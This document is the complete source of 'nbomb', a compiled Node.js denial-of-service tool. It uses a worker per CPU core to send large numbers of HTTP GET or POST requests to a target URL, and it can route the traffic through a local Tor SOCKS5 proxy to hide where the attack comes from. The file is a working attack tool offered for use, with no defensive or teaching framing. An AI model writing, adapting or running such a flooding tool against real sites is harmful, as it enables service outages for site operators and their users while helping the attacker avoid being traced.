#!/usr/local/bin/node
"use strict";

var _cluster = _interopRequireDefault(require("cluster"));

var _colors = _interopRequireDefault(require("colors"));

var _commandLineArgs = _interopRequireDefault(require("command-line-args"));

var _commandLineUsage = _interopRequireDefault(require("command-line-usage"));

var _os = _interopRequireDefault(require("os"));

var _axios = _interopRequireDefault(require("axios"));

var _socksProxyAgent = _interopRequireDefault(require("socks-proxy-agent"));

require("@babel/polyfill");

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _objectSpread(target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i] != null ? arguments[i] : {}; var ownKeys = Object.keys(source); if (typeof Object.getOwnPropertySymbols === 'function') { ownKeys = ownKeys.concat(Object.getOwnPropertySymbols(source).filter(function (sym) { return Object.getOwnPropertyDescriptor(source, sym).enumerable; })); } ownKeys.forEach(function (key) { _defineProperty(target, key, source[key]); }); } return target; }

function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }

var numCpus = _os.default.cpus().length;

if (_cluster.default.isMaster) {
  var optionList = [{
    name: "target",
    alias: "t",
    type: String,
    description: "target to attack\n",
    typeLabel: "{underline url}"
  }, {
    name: "method",
    alias: "m",
    type: String,
    defaultValue: "GET",
    description: "method for attack [default value is GET]\n",
    typeLabel: "{underline GET POST}"
  }, {
    name: "amount",
    alias: "a",
    type: Number,
    defaultValue: 1000,
    description: "amount to send attacks [default value is 1000]\n"
  }, {
    name: "proxy",
    alias: "p",
    type: Boolean,
    defaultValue: false,
    description: "socks5 proxy [localhost:9050]"
  }, // {
  //   name: "interval",
  //   alias: "i",
  //   type: Number,
  //   defaultValue: 0,
  //   description: `interval to rest while sending next attack.
  //     don't use it if you don't know what it does [default is 0]\n`
  // },
  {
    name: "help",
    alias: "h",
    type: Boolean,
    description: "show this help\n",
    typeLabel: ""
  }];
  var options = (0, _commandLineArgs.default)(optionList);

  if (options.help || !options.target) {
    console.log((0, _commandLineUsage.default)([{
      header: "nbomb",
      content: "Dos attack tool made with node.js"
    }, {
      header: "Options",
      optionList: optionList
    }, {
      content: "{underline k9326239@gmail.com}"
    }]));
    process.exit();
  }

  console.log("NBomb Started");
  console.log("Reading options");

  if (options.proxy) {
    console.log(_colors.default.green("On Proxy"));
  } else {
    console.log(_colors.default.red("NOT USING PROXY!!!"));
  }

  var clusters = []; // Fork workers.

  for (var i = 0; i < numCpus; i++) {
    clusters.push(_cluster.default.fork());
  }

  var counter = options.amount;
  clusters.forEach(function (cluster, i) {
    cluster.on("online", function () {
      console.log("worker ".concat(i, " online"));
    });
    cluster.on("message", function () {
      counter -= 1;
      if (counter < 1) return process.exit();
    });
    cluster.on("exit", function () {
      console.log("worker ".concat(i, " offline"));
    });
  });

  for (var _i = 0, amount = options.amount; _i < amount; _i++) {
    clusters[Math.floor(amount & 7)].send(_objectSpread({}, options, {
      left: amount - _i
    }));
  }
} else {
  process.on("message", function (msg) {
    var axiosOptions = {
      url: msg.target,
      method: msg.method
    };
    var axiosProxyOptions = {
      url: msg.target,
      method: msg.method,
      httpAgent: new _socksProxyAgent.default("socks5://127.0.0.1:9050"),
      httpsAgent: new _socksProxyAgent.default("socks5://127.0.0.1:9050")
    };
    (0, _axios.default)(msg.proxy ? axiosProxyOptions : axiosOptions).then(function () {
      console.log(_colors.default.green("attack performed ", _colors.default.blue(msg.left)));
    }).catch(function () {
      console.log(_colors.default.red("ERROR ", _colors.default.blue(msg.left)));
    }).finally(function () {
      process.send("");
    });
  });
}